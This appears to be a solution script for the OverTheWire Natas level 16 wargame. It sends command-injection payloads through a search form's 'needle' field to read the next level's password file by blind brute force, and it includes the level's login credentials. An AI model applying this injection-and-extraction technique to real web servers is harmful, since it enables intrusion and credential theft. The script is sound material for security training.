#!/bin/bash

chars=''
passwd=''

for i in {a..z} {A..Z} {0..9};
do
  result=$(curl -s -u natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh \
  http://natas16.natas.labs.overthewire.org/ -X POST \
  -d "needle=hello\$(grep $i /etc/natas_webpass/natas17)" | wc -l)

  if [ "$result" == 28 ]; then
    chars+=$i
  fi
done

for i in {0..31}
do
  for i in $(seq 0 ${#chars});
  do
    result=$(curl -s -u natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh \
    http://natas16.natas.labs.overthewire.org/ -X POST \
    -d "needle=hello\$(grep ^$passwd${chars:i:1} /etc/natas_webpass/natas17)" | \
    wc -l)

    if [ "$result" == 28 ]; then
      passwd+="${chars:i:1}"
      break
    fi
  done
done

echo $passwd

